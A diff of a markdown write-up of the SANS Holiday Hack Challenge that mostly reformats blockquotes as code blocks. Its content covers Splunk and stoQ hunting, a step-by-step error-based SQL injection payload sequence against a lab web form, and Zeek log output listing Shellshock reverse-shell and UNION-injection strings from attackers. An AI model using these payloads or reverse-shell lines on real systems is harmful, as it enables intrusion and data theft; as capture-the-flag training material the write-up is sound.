@@ -142,26 +142,34 @@ Following suggestions from Alice, we can search for "index=main santa" to find d
 Again, following advice from Alice, using the search "index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3" and checking the "dest_host" field, we find a host called "144.202.46.214.vultr.com".
 The next step is to find the document that launched the malicious PowerShell code. Following the guidance from Alice and keeping in mind whether the PID is in hex or decimal eventually leads us to the following command:
 
-> C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o "
+```text
+C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Windows\Temp\Temp1_Buttercups_HOL404_assignment (002).zip\19th Century Holiday Cheer Assignment.docm" /o "
+```
 
 
 We can then use stoQ to search for unique email addresses. Using the following query groups the emails by sender (case-insensitive):
 
-> index=main sourcetype=stoq | rename results{}.workers.smtp.from as from| eval from=lower(from)| top limit=100 from
+```text
+index=main sourcetype=stoq | rename results{}.workers.smtp.from as from| eval from=lower(from)| top limit=100 from
+```
 
 This shows 22 unique addresses but one of them if the professor himself leaving us with 21 unique senders.
 To find the password for the zip we search for "password" among the email bodies using the following query:
 
-> index=main sourcetype=stoq password | table results{}.workers.smtp.from results{}.workers.smtp.body
+```text
+index=main sourcetype=stoq password | table results{}.workers.smtp.from results{}.workers.smtp.body
+```
 
 This reveals that the password is "123456789" and was sent together with the zip file by "bradly.buttercups@eifu.org".
 To get the actual file we use the following stoQ query as suggested by Alice:
 
-> index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>" | eval results = spath(_raw, "results{}") 
-> | mvexpand results
-> | eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename 
-> | search fullpath!="" 
-> | table filename,fullpath
+```text
+index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>" | eval results = spath(_raw, "results{}")
+| mvexpand results
+| eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename
+| search fullpath!=""
+| table filename,fullpath
+```
 
 But when we try to download the file we get the following message:
 
@@ -181,7 +189,9 @@ So instead we look at the "core.xml" file
 $ curl -v 'https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4'
 ```
 
-> <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Holiday Cheer Assignment</dc:title><dc:subject>19th Century Cheer</dc:subject><dc:creator>Bradly Buttercups</dc:creator><cp:keywords></cp:keywords><dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description><cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy><cp:revision>4</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified><cp:category></cp:category></cp:coreProperties>
+```xml
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><dc:title>Holiday Cheer Assignment</dc:title><dc:subject>19th Century Cheer</dc:subject><dc:creator>Bradly Buttercups</dc:creator><cp:keywords></cp:keywords><dc:description>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</dc:description><cp:lastModifiedBy>Tim Edwards</cp:lastModifiedBy><cp:revision>4</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2019-11-19T14:54:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2019-11-19T17:50:00Z</dcterms:modified><cp:category></cp:category></cp:coreProperties>
+```
 
 Where we find the message: "Kent you are so unfair. And we were going to make you the king of the Winter Carnival."
 
@@ -301,64 +311,74 @@ Checking my mailbox I saw that I had received an email with the subject "You're 
 If we try to submit an application we quickly find that the website has a SQL injection in the INSERT statement used to save the application.
 For example, adding a single quote to the essay field yields the following error:
 
-> Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('1', '3@4.com', '4', '5', '6', '7'', 'pending')
-> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'pending')' at line 2
+```text
+Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('1', '3@4.com', '4', '5', '6', '7'', 'pending')
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'pending')' at line 2
+```
 
 Since the SQL error is printed out we can used error based SQL injection to leak data. For example, by submitting an essay with the following value:
 
-> '*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'
+```text
+'*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'
+```
 
 We get the this error back:
 
-> Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('x', 'lol+123@kok.com', '1', '2', '3', 'bond'*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'', 'pending')
-> XPATH syntax error: ':10.1.43-MariaDB-1~bionic'
+```text
+Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('x', 'lol+123@kok.com', '1', '2', '3', 'bond'*extractvalue(rand(),concat(0x3a, (SELECT version()) ))*'', 'pending')
+XPATH syntax error: ':10.1.43-MariaDB-1~bionic'
+```
 
 Continuing in the same fashion, we can use the following values to extract the schema names, table names, column names and finally values from the database:
 
-> ; Get schemas  
-> '*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 0,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 1,1) ))*'  
->   
-> ; Get tables in schema "elfu"  
-> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 0,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 1,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 2,1) ))*'  
->   
-> ; Get columns in table "krampus"  
-> '*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 0,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 1,1) ))*'  
->   
-> ; Get values in table "krampus"  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 0,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 1,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 2,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 3,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 4,1) ))*'  
-> '*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 5,1) ))*'  
+```text
+; Get schemas
+'*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 0,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT table_schema from information_schema.tables group by table_schema limit 1,1) ))*'
+
+; Get tables in schema "elfu"
+'*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 0,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 1,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT table_name from information_schema.tables where table_schema = 'elfu' group by table_name limit 2,1) ))*'
+
+; Get columns in table "krampus"
+'*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 0,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT column_name from information_schema.columns where table_name = 'krampus' and table_schema = 'elfu' limit 1,1) ))*'
+
+; Get values in table "krampus"
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 0,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 1,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 2,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 3,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 4,1) ))*'
+'*extractvalue(rand(),concat(0x3a, (SELECT path from krampus limit 5,1) ))*'
+```
 
 
 Which results in the following corresponding values:
 
-> ; Schemas  
-> elfu  
-> information_schema  
->   
-> ; Tables of schema "elfu"  
-> applications  
-> krampus  
-> students  
->   
-> ; Columns of table "krampus"  
-> id  
-> path  
->   
-> ; Values of column "path" in table "krampus"  
-> '/krampus/0f5f510e.png'  
-> '/krampus/1cc7e121.png'  
-> '/krampus/439f15e6.png'  
-> '/krampus/667d6896.png'  
-> '/krampus/adb798ca.png'  
-> '/krampus/ba417715.png'  
+```text
+; Schemas
+elfu
+information_schema
+
+; Tables of schema "elfu"
+applications
+krampus
+students
+
+; Columns of table "krampus"
+id
+path
+
+; Values of column "path" in table "krampus"
+'/krampus/0f5f510e.png'
+'/krampus/1cc7e121.png'
+'/krampus/439f15e6.png'
+'/krampus/667d6896.png'
+'/krampus/adb798ca.png'
+'/krampus/ba417715.png'
+```
 
 
 We can then download these files:
@@ -507,22 +527,24 @@ $ while read ua; do
 done < bad_agents_uniq.txt | sort | uniq -c | sort -nr 
 ```
 
-> 19 Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)  
-> 17 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5  
-> 15 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5  
-> ...  
-> 9 Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18  
-> 9 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0  
-> 5 Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)  
-> ...  
-> 1 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1  
-> 1 () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1  
-> 1 () { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'  
-> 1 1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1  
-> 1 1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --  
-> 1 1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*  
-> 1 1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1  
-> 1 1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1  
+```text
+19 Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)
+17 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5
+15 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5
+...
+9 Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18
+9 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0
+5 Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)
+...
+1 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1
+1 () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1
+1 () { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'
+1 1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1
+1 1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --
+1 1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*
+1 1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1
+1 1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1
+```
 
 This reveals a bunch of fairly common user agents but also quite a few rare user agents. If we disregard the popular user agents and search for all IP addresses made from user agents seen less than 9 times (stored in "bad_agents_uniq_trim.txt") we get output similar to this:
 
@@ -554,13 +576,18 @@ Finally we take the IP addresses from the known evil requests from before and co
 $ jq -r '."id.orig_h"' bad_requests.json |sort|uniq > bad_ip.txt
 $ cat bad_ip.txt bad_ip2.txt|sort |uniq|tr '\n' ','
 ```
-> 0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,1.185.21.112,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,132.45.187.177,13.39.153.254,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,190.245.228.38,19.235.69.221,193.228.194.36,194.143.151.224,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,220.132.33.81,2.230.60.70,223.149.180.133,22.34.153.164,2.240.116.254,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,230.246.50.221,231.179.108.238,233.74.78.199,23.49.177.78,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,25.80.197.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.130,42.103.246.250,42.127.244.30,42.16.149.112,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,87.195.80.126,9.206.212.33,92.213.148.0,95.166.116.45,97.220.93.190,
+
+```text
+0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,1.185.21.112,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,132.45.187.177,13.39.153.254,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,190.245.228.38,19.235.69.221,193.228.194.36,194.143.151.224,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,220.132.33.81,2.230.60.70,223.149.180.133,22.34.153.164,2.240.116.254,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,230.246.50.221,231.179.108.238,233.74.78.199,23.49.177.78,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,25.80.197.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.130,42.103.246.250,42.127.244.30,42.16.149.112,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,87.195.80.126,9.206.212.33,92.213.148.0,95.166.116.45,97.220.93.190,
+```
 
 
 This is roughly 100 addresses which we can submit as a firewall filter.
-Doing this and checking the source of "https://srf.elfu.org/santa.html" reveals the route ID:
+Doing this and checking the source of "<https://srf.elfu.org/santa.html>" reveals the route ID:
 
-> $(".textMeter").html("Route Calculation Success! RID:0807198508261964");	
+```javascript
+$(".textMeter").html("Route Calculation Success! RID:0807198508261964");
+```
 
 ## Extra Objectives - Terminals
 
